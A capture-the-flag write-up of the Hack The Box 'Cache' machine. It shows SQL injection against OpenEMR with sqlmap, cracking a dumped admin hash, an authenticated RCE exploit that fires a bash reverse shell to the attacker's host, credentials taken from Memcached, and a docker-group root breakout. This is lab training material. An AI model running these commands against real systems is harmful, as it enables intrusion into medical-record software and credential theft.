![](cache-banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.188 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.188`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
2201/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

## web_server

* pocking around the site in firefox using `inspect element` tool i notice a js file in `login` page.

	  functionality.js

* going to `functionality.js` revels some intresting data

	  ...
	  if(Password != 'H@v3_fun')
	  ...
	  if(Username != "ash")
	  ...

## Fuzzing

* create wordlist from website text

`cewl -w wordlist http://10.10.10.188`

* Using `wfuzz` tool to fuzz for sub domains or Virtual host.
`wfuzz -w wordlist -H "HOST:FUZZ.htb" -u http://10.10.10.188/ --hc 400`
```
000000415:   302        0 L      0 W      0 Ch        "HMS"   
```

* and found Virtual Host `hms.htb` running on port 80 

### hms.htb

* heading over to `http://hms.htb` i noticed:

	- url is redirected to `http://hms.htb/interface/login/login.php?site=default`
	- this is a login page
	- login page is a instance of OpenEMR
	- openEMR copyright 2018

## Google

**Search :** `openEMR`

**search results**

* [OpenEMR](https://www.open-emr.org/) is a medical practice management software which also supports Electronic Medical Records. It is ONC Complete Ambulatory EHR certified and it features fully integrated electronic medical records, practice management for a medical practice, scheduling, and electronic billing.
* 2018 openEMR releases are `5.0.1 to 5.0.1.6

**search :** `openEMR 5.0.1 - 5.0.1.6 vulnerabilities`

**search results**

* OpenEMR <= 5.0.1 - (Authenticated) Remote Code Execution, [ExploitDB](https://www.exploit-db.com/exploits/45161)
- complete documentation on openEMR 5.0.1.3 vulnerabilities, [open-emr.org doc](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf)
	- reading document i found out that there is a sql injection vuln registration page vulnerabilities

# User Exploiting

**_Tried the Authenticated RCE exploit with `ash` creds but it did not worked, after SQLi it helps so i keep it._**

## SQLi

**why**
*[From openEMR document](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf)*
* An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to the registration page and modifying the requested url
* Some examples of pages in the portal directory that are accessible after browsing to the registration page include:

	  -add_edit_event_user.php
	  -find_appt_popup_user.php
	  -get_allergies.php-get_amendments.php
	  -get_lab_results.php-get_medications.php
	  -get_patient_documents.php
	  -get_problems.php
	  -get_profile.php-portal_payment.php
	  -messaging/messages.php
	  -messaging/secure_chat.php
	  -report/pat_ledger.php
	  -report/portal_custom_report.php
	  -report/portal_patient_report.php

* as document say from registration page we can modify these pages requests and access to the database using sql injection

**how**

* navigating to the registration page
* request for `hms.htb/portal/add_edit_event_user.php?eid=1`
* sqli `eid='`through an sql error

### sqlmap

* **Frist**, capture `hms.htb/portal/add_edit_event_user.php?eid=1` from `registration page` in burpSuite.
* **Second**, than dump data using sqlmap tool,

	  sqlmap -r emr.req --dbs --batch
	  sqlmap -r emr.req --dbs --batch openemr --tables
	  sqlmap -r emr.req --dbs --batch openemr -T users_secure --dump

* in the dump i found `user:hash`

	  Database: openemr
	  Table: users_secure
	  [1 entry]
	  +------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+
	  | id   | salt                           | username      | password                                                     | last_update         |
	  +------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+
	  | 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 |
	  +------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+
	  ...[snip]...


*ippsec manual sqli [video](https://www.youtube.com/watch?v=kfLU5-Eeyhw&t=1390s)*

#### john

**hash :** `openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B`

`john -w=/usr/share/wordlists/rockyou.txt hash`
```
xxxxxx          openemr_admin
```

### creds
`openemr_admin:xxxxxx`

## User Authenticated RCE

### using script [OpenEMR < 5.0.1 - (Authenticated) RCE](exploit/openEMR%3C5.0.1-Authenticated_RCE.py)

*ippsec [video](https://www.youtube.com/watch?v=kfLU5-Eeyhw&t=3360s)*

`python openEMR-RCE.py http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/tun0/1337 0>&1'`

* this command specified in the Exploit itself
* it excute reverse shell and connect back to netcat on specified port
	
	`nc -nvlp 1337`

* I got an `www-data@cache:~$` shell

#### enumeration www-data

* `/etc/passwd` reviles that there is a use ash 
* use ash creds to `su` to user `ash:H@v3_fun`
* got  shell as ash user
* user ash have user flag

	  ash@cache:~$ cat user.txt

# Local Enumeration

* check network services

	  ash@cache:~$ netstat -tnlp
	  Proto Recv-Q Send-Q Local Address           Foreign Address         State
	  tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN

* search for port `11211` found out that this is a Memcached server that running locally
* searching about Memcache on google i endup on a [hackingarticles.in](https://www.hackingarticles.in/penetration-testing-on-memcached-server/) blog post .

## dump Memcache data

* I use telnet to connect to Memcached server from ash user shell

	`ash@cache:~$ telnet 127.0.0.1 11211`

	  Trying 127.0.0.1...
	  Connected to 127.0.0.1.

	  stats slabs
	  STAT active_slabs 1

	  stats cachedump 1 0
	  ITEM user [5 b; 0 s]
	  ITEM passwd [9 b; 0 s]

	  get user
	  VALUE user 0 5
	  luffy
	  END

	  get passwd
	  VALUE passwd 0 9
	  0n3_p1ec3
	  END

### creds
`luffy:0n3_p1ec3`
```
ash@cache:~$ su - luffy
Password: 0n3_p1ec3
luffy@cache:~$
```

### Enumeration luffy

* checking user luffy groups

	  luffy@cache:~$ id
	  uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)

* checking if there is any running container, There are not containers currently running

	  luffy@cache:~$ docker ps
	  CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES

* cheacking if There is any docker image

	  luffy@cache:~$ docker image ls
	  REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
	  ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB

# Root Privesc

* found docker shell at [GTFO Bins](https://gtfobins.github.io/gtfobins/docker/)
* it can be used to break out from restricted environments by spawning an interactive system shell. The resulting is a root shell.

	  docker run -v /:/mnt --rm -it alpine chroot /mnt bash

* in my case cache have ubuntu docker image

	  docker run -v /:/mnt --rm -it docker chroot /mnt bash